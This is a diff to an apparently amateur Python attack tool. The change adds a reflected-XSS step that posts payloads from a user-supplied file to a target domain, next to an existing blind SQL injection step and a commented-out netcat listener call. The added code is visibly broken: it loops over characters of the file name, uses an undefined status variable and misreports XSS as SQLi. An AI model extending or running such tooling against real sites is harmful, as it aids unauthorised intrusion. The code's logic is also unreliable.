@@ -99,7 +99,7 @@ def main():
             first_slow_print(wi + rd + "[-]" + wi + "File scan.txt Not Found Error")
            #sub.call(['nc ','-l',ip,port])
            try:
-            first_slow_print(wi + yl + '[!]' + wi  + 'Testing Blind Sql Injection on the target')
+            first_slow_print(wi + yl + '[!]' + wi  + 'Testing Blind Sql Injection on the target.')
             url = "http://" + ip
             try:
              currentdir = os.getcwd()
@@ -121,6 +121,20 @@ def main():
               print(wi + rd + '[-]' + wi + 'Failed Attempt.')
            except TypeError:
             print(wi + rd + '[-]' + wi + "Error Occured.")
+           try: 
+            first_slow_print(wi + yl + '[!]' + wi + 'Trying Reflected XSS on the target.')
+            wordxss = input(wi + yl + "#" + wi + "XSS Payload location: ")
+            for i in wordxss:
+             i.strip()
+             requestxss = request.post(domain + '/' + i)
+             xss_status = requestxss.status_code
+             print(requestxss)
+             if code >= 200 and not code > 399:
+              print(wi + gr + '[+]' + wi + 'SQLi Payload Injected Successfully!')
+             elif code >= 400:
+              print(wi + rd + '[-]' + wi + 'Failed Attempt.')
+           except FileNotFoundError:
+              print(wi + rd + '[-]' + wi + "Error Occured.")                
        else:
           print(wi +  rd + '[-]' + wi + "Host is down or blocking the tool's probes")
     except TypeError:
@@ -132,4 +146,8 @@ def main():
     #
 
 main()
-       
+################################
+#Originally Made By FonderElite#
+# Dont Try To Copy Paste!      #
+# Script Kiddie!               #
+################################
